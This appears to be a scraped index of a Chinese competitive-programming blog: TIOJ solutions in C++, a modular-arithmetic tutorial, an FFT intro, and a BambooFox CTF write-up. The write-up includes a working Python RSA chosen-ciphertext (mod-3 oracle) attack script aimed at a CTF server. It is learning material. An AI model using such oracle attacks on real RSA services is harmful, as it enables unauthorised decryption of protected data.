的時候多出去的可以直接丟掉\n至於 popped 陣列應該還是要開到 1e6 ，因為被 pop 的東西有可能編號很大，TIOJ上的測資似乎沒考慮到這個地方所以開 5e5 也能AC\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026#34;lib1168.h\u0026#34; #define ff first #define ss second const int N = 500001; struct node { int val, id; bool operator\u0026lt;(const node \u0026amp;b)const{return val\u0026lt;b.val;} }; struct heap { node v[N]; int sz; void push(node x) { v[sz++] = x; std::push_heap(v,v+sz); if(sz \u0026gt;= N) sz = N-1; } node top() {return v[0];} void pop() { std::pop_heap(v,v+sz); --sz; } } mx, mn; int tot; bool popped[N]; // should be N*2? inline void push(int x) { mx.push({x, tot}); mn.push({-x, tot}); ++tot; } inline int big() { while(popped[mx.top().id]) mx.pop(); return mx.top().val; } inline int small() { while(popped[mn.top().id]) mn.pop(); return -mn.top().val; } inline void pop_big() { while(popped[mx.top().id]) mx.pop(); popped[mx.top().id] = 1; mx.pop(); } inline void pop_small() { while(popped[mn.top().id]) mn.pop(); popped[mn.top().id] = 1; mn.pop(); } ","permalink":"https://omeletwithoutegg.github.io/2020/01/25/TIOJ-1168/","tags":["TIOJ","data-structure"],"title":"TIOJ-1168"},{"contents":"C.幼稚國王的獎賞 https://tioj.ck.tp.edu.tw/problems/1094\nDescription 定義一個非負整數集合的價值是裡面所有數字XOR起來\n給定一些非負整數，問你能選出價值最高的子集價值是多少？\nSolution 經典題 maximum subset xor\n線性基 首先可以把每個數字的二進位看成模2的$k$維向量\nspan 我們說一群向量$S = {\\textbf{v}_ 1, \\textbf{v}_ 2, \\dots, \\textbf{v}_ n}$的線性生成空間是\n$$\n\\textrm{span}(S) = { \\sum _ {i=1}^n\\lambda _ i \\textbf{v} _ i }\n$$\n也就是說$\\textrm{span}(S)$代表的是所有$S$內的元素的有限線性組合\nlinear independent 對於一組向量${\\textbf{v}_ 1, \\textbf{v}_ 2, \\dots, \\textbf{v} _ n}$\n若存在不全為$0$的$\\lambda_1, \\lambda_2, \\dots, \\lambda_n$使得\n$$\n\\sum _ {i=1}^n\\lambda_ i \\textbf{v}_ i = \\textbf{0}\n$$\n則我們說這群向量是線性相關的；反之則稱為線性獨立(linear independent)\n一組線性相關的向量至少有一個向量可以用其他向量表示\n說明: 不失一般性設$\\lambda _ 1 \\neq 0$，則\n$$\n\\textbf{v} _ 1 = \\sum _ {i=2}^n \\frac{-\\lambda _ i}{\\lambda _ 1} \\textbf{v} _ i\n$$\nbasis 一組向量$B={\\textbf{e}_ 1, \\textbf{e}_ 2, \\dots, \\textbf{e}_ n}$是一個向量空間$V$的基底(basis)若且唯若$\\textrm{span}(B) = V$且$B$是一組線性獨立的向量\n由定義可以直接推出，$V$中的所有向量$\\textbf{v}$都可以唯一表示為$B$裡面的向量的線性組合，因為\n$$\n\\textbf{v} = \\sum \\lambda_ i \\textbf{e}_ i = \\sum \\lambda_ i\u0026rsquo; \\textbf{e}_ i \\Leftrightarrow \\sum (\\lambda_ i - \\lambda_ i\u0026rsquo;) \\textbf{e}_ i = \\textbf{0} \\Leftrightarrow \\forall i, \\lambda_ i = \\lambda_ i'\n$$\n高斯消去 講了那麼多廢話，這題到底要怎麼做呢？\n設給定的數字集合是$V$，可以發現我們要求的就是$S = \\textrm{span}(V)$中的最大值，透過維護$S$的基底集合$B$，我們能夠快速得知是否能夠湊出一個第k位是1的XOR值\n當我們考慮到第k位的時候，我們至多只需要保存一個最高位是第k位的基底，因為假設有兩個基$x,y$其第k位都是1，則可以用$x \\oplus y$來代替$x$\n嘗試加入一個數字$x$到基底時，我們從$x$的最高位k開始看\n假設已經有一個基底$e$的最高位是第k位，我們就可以把$x$替換成$x \\oplus e$，如果此時$x$變為0代表$x$已經可以用前面的一些基底湊出來了，加入$x$會破壞線性獨立的特性；\n反之，若沒有一個基底$e$的最高位是第k位，那我們就直接加入$x$作為提供第k位的1的人\n那麼最後我們要怎麼取最大值呢？同樣從最高位開始看\n如果目前看到第k位，並且答案的第k位是0\n若又剛好存在一個最高位是第k位的基底$e$的話，我們取$e$肯定不會虧嘛\n因為$e$是我們維護唯一一個最高位是第k位的基底，之後不會再考慮到第k位以上的東西了\n如果上面的東東聽不懂的話就努力看code參透吧QQ\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int K = 20; int n,v; int bas[K]; void ins(int x) { for(int i = K-1; i \u0026gt;= 0; i--) if(x \u0026amp; (1\u0026lt;\u0026lt;i)) { if(bas[i]) x ^= bas[i]; else { bas[i] = x; break; } } } int getmax() { int res = 0; for(int i = K-1; i \u0026gt;= 0; i--) { if((res ^ bas[i]) \u0026amp; (1\u0026lt;\u0026lt;i)) res ^= bas[i]; } return res; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); while(cin \u0026gt;\u0026gt; n \u0026amp;\u0026amp; n) { for(int i = 0; i \u0026lt; K; i++) bas[i] = 0; for(int i = 0; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; v; ins(v); } cout \u0026lt;\u0026lt; getmax() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/01/24/TIOJ-1094/","tags":["TIOJ","bitmask","linear-algebra"],"title":"TIOJ-1094"},{"contents":"我很忙 https://tioj.ck.tp.edu.tw/problems/1408\nDescription 給定$n$個時段$[l_i, r_i)$\n問至少有多少單位時間要是忙碌的才能滿足\n「每個時段中都有至少$c_i$單位時間是忙碌的」(每單位時間都不是忙碌就是空閒)\n註: 題目保證有解\nSolution 看到這種很多區間的題目，就會很想把它們照右界從小到大排序\n可以想到一個greedy策略\n按右界遞增排序好之後，遇到一個時段就看是否已經滿足條件\n如果已經滿足了就跳過\n如果還沒有的話就必須選一些時間由空閒變為忙碌，而這些時間依照貪心的原則是從越右邊開始選越好\n(選左邊的不會對之後右界更大的時段有比較多幫助)\n檢查是否滿足條件只要維護區間和\n於是我的作法是用一棵線段樹配上一個 stack\n每次新插入一個時段，先以線段樹查詢這個區間內忙碌的時間總共是多少\n接著對於剩下需要再增加的時間，維持 stack 內是不相交且排序好的一些時段，代表那些時間必須要是忙碌的\n只要看目前最右邊的忙碌時段就能處理好\n這份AC code中我沒有值域壓縮(因為我懶)\n一臉在CF上欠hack\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #include \u0026lt;bits/stdc++.h\u0026gt; #define pb emplace_back #define mem(v,x) memset(v, x, sizeof(v)) #define ff first #define ss second using namespace std; const int N = 100025; int sum[N\u0026lt;\u0026lt;1],tag[N]; void upd(int p, int d, int h) { sum[p] += d * (1\u0026lt;\u0026lt;h); if(p \u0026lt; N) tag[p] += d; } void push(int p) { for(int h = __lg(N); h \u0026gt;= 0; h--) { int i = p\u0026gt;\u0026gt;h; if(!tag[i\u0026gt;\u0026gt;1]) continue; upd(i, tag[i\u0026gt;\u0026gt;1], h); upd(i^1, tag[i\u0026gt;\u0026gt;1], h); tag[i\u0026gt;\u0026gt;1] = 0; } } void pull(int p) { for(int h = 0; p \u0026gt; 1; h++, p\u0026gt;\u0026gt;=1) sum[p\u0026gt;\u0026gt;1] = sum[p]+sum[p^1] + tag[p\u0026gt;\u0026gt;1] * (2\u0026lt;\u0026lt;h); } void modify(int l, int r, int d) { int L = l, R = r, h = 0; for(l+=N, r+=N; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1, h++) { if(l\u0026amp;1) upd(l++, d, h); if(r\u0026amp;1) upd(--r, d, h); } pull(L+N), pull(R-1+N); } int query(int l, int r) { push(l+N), push(r-1+N); int res = 0; for(l+=N, r+=N; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res += sum[l++]; if(r\u0026amp;1) res += sum[--r]; } return res; } vector\u0026lt;pair\u0026lt;int,int\u0026gt;\u0026gt; stk; void ins(int l, int r, int c) { c -= query(l, r); if(c \u0026lt;= 0) return; int now = r; while(stk.size() \u0026amp;\u0026amp; now - stk.back().ss \u0026lt;= c) { c -= now - stk.back().ss; now = stk.back().ff; modify(stk.back().ff, stk.back().ss, -1); stk.pop_back(); } stk.pb(now-c, r); modify(now-c, r, 1); //for(auto s: stk) cout \u0026lt;\u0026lt; \u0026#39;[\u0026#39; \u0026lt;\u0026lt; s.ff \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; s.ss-1 \u0026lt;\u0026lt; \u0026#39;]\u0026#39; \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } struct seg { int l, r, c; } v[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n; while(cin \u0026gt;\u0026gt; n \u0026amp;\u0026amp; n) { for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; v[i].l \u0026gt;\u0026gt; v[i].r \u0026gt;\u0026gt; v[i].c; sort(v,v+n, [](seg \u0026amp;a, seg \u0026amp;b){return a.r\u0026lt;b.r;}); stk.clear(); mem(sum, 0), mem(tag, 0); for(int i = 0; i \u0026lt; n; i++) ins(v[i].l, v[i].r, v[i].c); int sum = 0; for(auto s: stk) sum += s.ss - s.ff; cout \u0026lt;\u0026lt; sum \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/01/14/TIOJ-1408/","tags":["TIOJ","greedy","data-structure"],"title":"TIOJ-1408"},{"contents":"1.銀河帝國旅行社 https://tioj.ck.tp.edu.tw/problems/1152\nDescription 給一棵樹，找最遠的兩個點的距離\nSolution 這裡用類似DP的方法\ndfs(i) 回傳一個 {ans, deepest} 分別表示以$i$為根子樹中的答案和從$i$往下走的最遠距離\n那ans可以分成有經過$i$的和沒經過的，有經過的就看最深的兩個子樹加起來是多少，沒經過的就遞迴下去算\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #include \u0026lt;bits/stdc++.h\u0026gt; #define pb emplace_back #define ff first #define ss second using namespace std; int n; vector\u0026lt;int\u0026gt; g[N]; pair\u0026lt;int,int\u0026gt; dfs(int i) { vector\u0026lt;int\u0026gt; tmp{0}; int ans = 0; for(int j: g[i]) { auto p = dfs(j); ans = max(ans, p.ff); tmp.pb(p.ss+1); } sort(all(tmp), greater\u0026lt;int\u0026gt;()); if(tmp.size() \u0026gt;= 2) ans = max(ans, tmp[0]+tmp[1]); return {ans, tmp[0]}; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n; for(int i = 0; i \u0026lt; n; i++) { int x; while(cin \u0026gt;\u0026gt; x \u0026amp;\u0026amp; ~x) g[i].pb(x); } cout \u0026lt;\u0026lt; dfs(0).ff \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2020/01/12/TIOJ-1152/","tags":["TIOJ","dp","tree"],"title":"TIOJ-1152"},{"contents":"這次打跨年CTF應該是我第一次打一個正常的CTF吧（？）\n感覺好多有趣的題目www\nhttps://ctf.bamboofox.cs.nctu.edu.tw/\nSolved Problems Welcome Joy說看題目給的影片就有flag了\nWeb newbie 被作業解掉，好像往source code的註解裡面找就對了\nLand-1 良心題\n直接copy全國模擬賽的code，送我們這些有打的人免費分數\nLand-2碰了好久一直CE，QQ\nI can\u0026rsquo;t see you 給了一個 what.rar ，Joy說不知道密碼不過丟到網路上某個工具就解開了XD(密碼是blind，聽說有人直接猜出來)\n之後會看到一張白底有黑點的圖片，對照盲人點字可以拿到flag\nHow2decompyle 題目給了一個沒有副檔名的檔案\n因為題目名稱裡面有py，嘗試把他丟到google找到的decompyler之類的東西?\n不過因為沒有副檔名他不吃，他只吃.py和.pyc(這時我們才知道我們大概拿到.pyc，是byte code XDD)\n於是改副檔名再丟一樣的地方就得到原始的.py檔了\n讀一下發現怎麼讓他跑出flag之後跑一跑就AC了(?)\nHappy New Year 賽中新增的題目，直接給flag ww\nTree 作業丟給我的(?)\n解壓縮他給的檔案之後發現看起來很欠DFS，確定葉節點是檔案可以直接讀之後就想寫個DFS\n不過shell的遞迴我不會，想說用python，不過還是要查套件:(，爛死\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from os import chdir from glob import glob def dfs(s): s = s[0] #print(\u0026#39;s = \u0026#39;, s) typ = s[-1] #print(typ) if typ == \u0026#39;+\u0026#39;: return dfs(glob(s+\u0026#34;/0_*\u0026#34;)) + dfs(glob(s+\u0026#34;/1_*\u0026#34;)) if typ == \u0026#39;x\u0026#39;: return dfs(glob(s+\u0026#34;/0_*\u0026#34;)) * dfs(glob(s+\u0026#34;/1_*\u0026#34;)) if typ == \u0026#39;r\u0026#39;: #print(\u0026#39;path = \u0026#39;, s) return int(open(s).read()) for i in range(37): chdir(\u0026#34;flag[\u0026#34;+str(i)+\u0026#34;]/\u0026#34;) print(chr(dfs(glob(\u0026#34;0_*\u0026#34;))), end = \u0026#39;\u0026#39;) chdir(\u0026#34;..\u0026#34;) AlphaGO 題目給了一張圖片，是一張棋盤，上面有一些位置有不同字元\n還有一個奇怪的Hint，不過看不懂\n和Joy討論之後我丟出是不是「依照AlphaGo某場比賽下子順序看棋盤上的字元」的想法\nJoy就把他給AC了XD，通靈死\noracle 蠻早看這題的，不過靠自己真的想不出來QQ\n他有給server.py，所以我們知道他server跑的東西是RSA\n可以做兩件詢問: 問flag加密後的東西和n、問一個密文C解密之後的明文mod 3的餘數\n並且每次連線的n都會是固定的\n解法蠻數學的，參考\nhttps://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher-zh/#rsa-byte-oracle\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #!/usr/bin/env python3 from Crypto.Util.number import * import os import sys import socket from fractions import Fraction host = \u0026#34;34.82.101.212\u0026#34; port = 20001 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) print(\u0026#39;connect success\u0026#39;) def ask(C): s.send(bytes(\u0026#39;2\\n\u0026#39;,\u0026#39;utf-8\u0026#39;)) _ = s.recv(1024) s.send(bytes(f\u0026#39;{C}\\n\u0026#39;,\u0026#39;utf-8\u0026#39;)) raw = s.recv(1024).split() #print(raw) return int(raw[2]) def main(): print(\u0026#39;main start\u0026#39;) _ = s.recv(1024) s.send(bytes(\u0026#39;1\\n\u0026#39;,\u0026#39;utf-8\u0026#39;)) raw = s.recv(1024).split() C = int(raw[2]); N = int(raw[5]) #exit() mp = {} for i in range(3): mp[-N * i % 3] = i ciph3 = pow(3, 65537, N) L = Fraction(0, 1) R = Fraction(N, 1) while R-L \u0026gt; 0.01: C = C * ciph3 % N K = mp[ask(C)] I = (R-L)/3 L = L + I*K R = L + I print(L, R) print(round(L)) print(round(R)) # L,R is plain text main() 這樣就可以得到一個整數\n6345976407505107785691848974596122250401442742754095997\n然後這邊有三個蠢錯誤\n不會用python的os套件，而且忽略了UX的輸出 一開始用浮點數搜尋，搜出來好幾次都不一樣XDD(而且每次都超久，要詢問近700次左右)，後來發現大家都寫分數就直接用分數了\u0026hellip;天真的以為python的浮點數能處理300多位 本來丟到網路上轉hex的東西是爛的QQ，用python才得到 1 2 \u0026gt;\u0026gt; hex(6345976407505107785691848974596122250401442742754095997) = \u0026#39;0x42414d424f4f464f587b53696d506c45305241436c337d\u0026#39; 然後就很明顯是兩個一組的ascii了，丟到網路上轉ascii的東西得到flag\n心得 好多用google的題目(X\n而且也好多部分應該要是先備知識的我也一直google XDD\n不過有解出題目感覺好有成就感（？）\n最後三個人的成績是27名\u0026gt;w\u0026lt;開心\n","permalink":"https://omeletwithoutegg.github.io/2020/01/02/bamboofox-ctf/","tags":["CTF","experience"],"title":"bamboofox-ctf"},{"contents":"警力配置 https://tioj.ck.tp.edu.tw/problems/2037\nDescription 裸的二分圖匹配\nSolution 這邊給匈牙利算法\n有一個subtask是給一個點數很多的樹\n特判用dp即可\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #define debug(x) ((void)0) #endif // local #define all(v) begin(v),end(v) #define siz(v) (ll(v.size())) #define get_pos(v,x) (lower_bound(all(v),x)-begin(v)) #define sort_uni(v) sort(begin(v),end(v)),v.erase(unique(begin(v),end(v)),end(v)) #define pb emplace_back #define ff first #define ss second #define mem(v,x) memset(v,x,sizeof v) using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = __gnu_pbds::priority_queue\u0026lt;T,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = __gnu_pbds::priority_queue\u0026lt;T,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; constexpr ld PI = acos(-1), eps = 1e-5; constexpr ll N = 2025, INF = 1e18, MOD = 998244353, K = 11, inf = 1e9; constexpr ll modpow(ll e,ll p,ll m=MOD) {ll r=1; for(;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r;} constexpr inline ll cdiv(ll x, ll m) { return (x+m-1)/m; } // ceiling divide, x/m for flooring divide struct BipartiteMatching { vector\u0026lt;int\u0026gt; G[N]; int mx[N],my[N],vis[N],now,n; void init(int _n) { n = _n; for(int i = 1; i \u0026lt;= n; i++) G[i].clear(); } void addEdge(int x,int y) { G[x].pb(y); } bool dfs(int x) { if(vis[x] == now) return false; vis[x] = now; for(int y:G[x]) if(my[y]==-1 || dfs(my[y])) return my[mx[x]=y]=x, true; return false; } int solve() { int ans = 0; for(int i = 1; i \u0026lt;= n; i++) vis[i] = 0, mx[i] = -1, my[i] = -1; for(int i = 1; i \u0026lt;= n; i++) if(mx[i] == -1) for(int j:G[i]) if(my[j]==-1) { my[mx[i]=j]=i; ans++; break; } for(now = 1; now \u0026lt;= n; now++) if(mx[now] == -1 \u0026amp;\u0026amp; dfs(now)) ans++; return ans; } } sv; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int t; cin \u0026gt;\u0026gt; t; while(t--) { int p,q,m; cin \u0026gt;\u0026gt; p \u0026gt;\u0026gt; q \u0026gt;\u0026gt; m; if(max(p,q) \u0026lt; N) { sv.init(max(p,q)); for(int i = 0; i \u0026lt; m; i++) { int a,b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; sv.addEdge(a,b); } cout \u0026lt;\u0026lt; sv.solve() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; }else { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; tr(p+q+1); vector\u0026lt;array\u0026lt;int,2\u0026gt;\u0026gt; dp(p+q+1); //assert(m == p+q-1); for(int i = 0; i \u0026lt; m; i++) { int a,b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; tr[a].pb(b+p); tr[b+p].pb(a); } function\u0026lt;void(int,int)\u0026gt; dfs = [\u0026amp;](int i, int p) { dp[i][1] = (p != 0); int mx = 0; for(int j:tr[i]) if(j!=p) { dfs(j,i); dp[i][1] += dp[j][0]; dp[i][0] += dp[j][0]; mx = max(mx, dp[j][1] - dp[j][0]); } dp[i][0] += mx; }; dfs(1,0); cout \u0026lt;\u0026lt; max(dp[1][0],dp[1][1]) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } ","permalink":"https://omeletwithoutegg.github.io/2019/12/31/TIOJ-2037/","tags":["TIOJ","dp","matching"],"title":"TIOJ-2037"},{"contents":"萬里長城 https://tioj.ck.tp.edu.tw/problems/1441\nDescription 給定一個序列，找出最長的「長城」子序列\n一個序列$\u0026lt; a_1,a_2,\\dots,a_n \u0026gt;$必須符合下列幾點才算是「長城」\nn是奇數 若$i$是偶數，則$a_i$必須小於相鄰的項 若$i$是奇數，則$a_i$必須大於相鄰的項 Solution 貪心法\n維護一個tail表示前$i$項滿足點2. 3.的最佳解，其結尾是多少\n假設下一個項h必須比tail大\n若h比tail大，那就直接接上去(並更新tail)，否則就把tail替換成h\n反之亦然\n證明大概可以用數歸吧(?)我也不太會說明QQ\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;iostream\u0026gt; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int n, tail = -1, inc = 1, ans = 0; cin \u0026gt;\u0026gt; n; while(n--) { cin \u0026gt;\u0026gt; h; if(h == tail) continue; if(h \u0026lt; tail ^ inc) ++ans, inc = !inc; tail = h; } if(inc) --ans; cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/31/TIOJ-1441/","tags":["TIOJ","greedy"],"title":"TIOJ-1441"},{"contents":"同餘算數 定義 $$m | (a-b) \\Leftrightarrow a \\equiv b \\pmod m$$\n或者說$a,b$同餘於$m$\n基本性質 當一個題目要求答案模一個數字$m$時\n通常我們都可以不用先算出一個很大的答案再取模\n利用下面的規則能夠在計算的過程中一邊取模(加減乘不會改變等價關係)\n設\n$$\n\\left \\{\n\\begin{matrix}\na_0 \\equiv a_1 \\pmod m\\newline\nb_0 \\equiv b_1 \\pmod m\n\\end{matrix}\n\\right .\n$$\n則易得到\n$$\n\\left \\{\n\\begin{matrix}\na_0 \\pm b_0 \\equiv a_1 \\pm b_1 \\pmod m\\newline\na_0b_0 \\equiv a_1b_1 \\pmod m\n\\end{matrix}\n\\right .\n$$\n模逆元 在一般實數的除法時，如果我們想知道除以$a$的結果，可以看成乘上倒數$1/a$\n也就是說找一個$x$使得$ax = 1$\n而在模$m$的情況下，我們同樣也可以用一個使得$ax \\equiv 1$的$x$來代替除以$a$的運算，稱為模逆元\n(如果常常打CF的話應該常常看見上面模逆元的敘述)\n求取模逆元$x = a^{-1}$只要把同餘關係改寫成$ax = my+1$就可以用擴展歐幾里得求解了\n注意$a,m$必須互質才會有模逆元\n例: 如果要求\n$$\n\\frac{a}{b} + \\frac{c}{d} = \\frac{ad+bc}{bd}\n$$\n由於\n$$\n(ab^{-1} + cd^{-1}) \\cdot bd \\equiv ad+bc \\pmod m\n$$\n也就是說$ab^{-1} + cd^{-1}$是和$\\frac{ad+bc}{bd}$等價的東西\n冪次們 從$a \\equiv b \\pmod m$不可推出$k^a \\equiv k^b \\pmod m$！\n不過依照歐拉定理可以化簡冪次上的東西\n由歐拉定理\n$$\n(a, n) = 1 \\Leftrightarrow a ^ {\\varphi(n)} \\equiv 1 \\pmod n\n$$\n可以知道\n$$\na \\equiv b \\pmod {\\varphi(n)} \\Leftrightarrow k^a \\equiv k^b \\pmod n\n$$\n假如$n$是質數的話還可以用來求模逆元\n因為對質數$p$來說$\\varphi(p) = p-1$，$a^{p-1} \\equiv 1 \\pmod p$\n故$a^{-1} \\equiv a^{p-2}$(注意0還是沒有模逆元)\n","permalink":"https://omeletwithoutegg.github.io/2019/12/30/Modulo-Arithmetic/","tags":["tutorial","math"],"title":"Modulo-Arithmetic"},{"contents":"黑色騎士團的飛彈野望 https://tioj.ck.tp.edu.tw/problems/1567\nDescription 給定平面上$n$個點，求至少要用幾個圓心在$x$軸上、半徑為$r$的圓才能覆蓋所有點\n若不可行輸出-1\nSolution 首先我們對每個點都可以知道包覆它的圓的圓心範圍在$x$軸的哪段區間\n那題目就轉換成在$x$軸上放一些圓心，使得每個點對應的區間內都至少有一個點被選到\n此為greedy經典題，按照右界排序後，由小到大檢查若某個區間還沒有放東西就放一個在它的右界\n證明很簡單，右界最小的區間內一定至少要選一個點放\n假設沒有選右界$r$而選了某個點$i$放，則改選右界，不會有其他右界更大的區間$I$包含$i$卻不包含$r$\n故選右界最小的區間的右界不會錯過最佳解\n無解的判斷就是只要有一個點和$x$軸距離超過$r$就不可行，否則顯然至多用$n$個圓可以覆蓋所有點\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #include \u0026lt;bits/stdc++.h\u0026gt; #define debug(x) ((void)0) #endif // local #define all(v) begin(v),end(v) #define siz(v) (ll(v.size())) #define get_pos(v,x) (lower_bound(all(v),x)-begin(v)) #define sort_uni(v) sort(begin(v),end(v)),v.erase(unique(begin(v),end(v)),end(v)) #define pb emplace_back #define ff first #define ss second #define mem(v,x) memset(v,x,sizeof v) using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = __gnu_pbds::priority_queue\u0026lt;T,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = __gnu_pbds::priority_queue\u0026lt;T,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; constexpr ld PI = acos(-1), eps = 1e-8; constexpr ll N = 1000025, INF = 1e18, MOD = 998244353, K = 256, inf = 1e9; constexpr inline ll cdiv(ll x, ll m) { return x/m + (x\u0026lt;0 ^ m\u0026gt;0) \u0026amp;\u0026amp; (x%m); } // ceiling divide constexpr ll modpow(ll e,ll p,ll m=MOD) {ll r=1; for(e%=m;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r;} ll n,r,x,y,ans; pld seg[N]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; r; for(int i = 0; i \u0026lt; n; i++) { cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; y; if(abs(y) \u0026gt; r) return cout \u0026lt;\u0026lt; -1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;, 0; ld d = sqrt(r*r-y*y); seg[i] = {x+d, x-d}; // {r, l} } sort(seg, seg+n); ld last = -INF; for(int i = 0; i \u0026lt; n; i++) if(seg[i].ss \u0026gt; last) { ++ans; last = seg[i].ff; } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } ","permalink":"https://omeletwithoutegg.github.io/2019/12/29/TIOJ-1567/","tags":["TIOJ","greedy"],"title":"TIOJ-1567"},{"contents":"捲積方法 OAO 本篇的重點應該是放在理解與使用與競程相關的捲積，其中會利用到FFT或NTT加速\n這邊先定義一下捲積$ * $是什麼\n$$\n(a * b) _ x = \\sum _ {i+j=x} a_i b_j\n$$\n實際上就等價於我們常見的多項式乘法\nnaive的做法是$\\mathcal{O}(n^2)$，顯然不夠令人滿意\n1 2 3 4 5 for(int i = 0; i \u0026lt; A.size(); i++) { for(int j = 0; j \u0026lt; B.size(); j++) { res[i+j] += A[i] * B[j]; } } DFT 先假設我們有兩個多項式\n$$\nA(x) = \\sum a_i x^i, B(x) = \\sum b_i x^i\\newline\nC(x) = 